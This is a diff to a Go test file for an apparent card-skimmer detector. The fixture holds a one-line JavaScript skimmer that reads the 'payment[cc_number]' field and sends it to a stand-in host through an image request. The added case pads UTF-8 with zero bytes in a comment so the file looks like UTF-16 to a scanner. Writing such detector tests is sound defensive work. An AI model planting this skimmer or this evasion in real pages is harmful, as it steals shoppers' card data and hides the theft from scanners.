@@ -35,7 +35,8 @@ func TestTextReader(t *testing.T) {
 	text := "var s='payment[cc_number]'; // été \U0001F600 " + strings.Repeat("x", 40)
 	read := func(b []byte) string {
 		t.Helper()
-		out, err := io.ReadAll(textReader(strings.NewReader(string(b))))
+		r, _ := textReader(strings.NewReader(string(b)))
+		out, err := io.ReadAll(r)
 		if err != nil {
 			t.Fatal(err)
 		}
@@ -69,7 +70,9 @@ func TestTextReader(t *testing.T) {
 func TestSkimmerInUTF16(t *testing.T) {
 	root := t.TempDir()
 	skim := `var f=document.querySelector('[name="payment[cc_number]"]');new Image().src="https://img.example.com/p?d="+f.value;`
-	for name, b := range map[string][]byte{"le.js": encodeUTF16(skim, true, true), "be.js": encodeUTF16(skim, false, true), "nobom.js": encodeUTF16(skim, true, false)} {
+	// UTF-8 whose start imitates UTF-16 with zero bytes in a comment runs as it is in a browser.
+	imitation := []byte("/*" + strings.Repeat("x\x00", 255) + "*/" + skim)
+	for name, b := range map[string][]byte{"le.js": encodeUTF16(skim, true, true), "be.js": encodeUTF16(skim, false, true), "nobom.js": encodeUTF16(skim, true, false), "imitation.js": imitation} {
 		if err := os.WriteFile(filepath.Join(root, name), b, 0o600); err != nil {
 			t.Fatal(err)
 		}
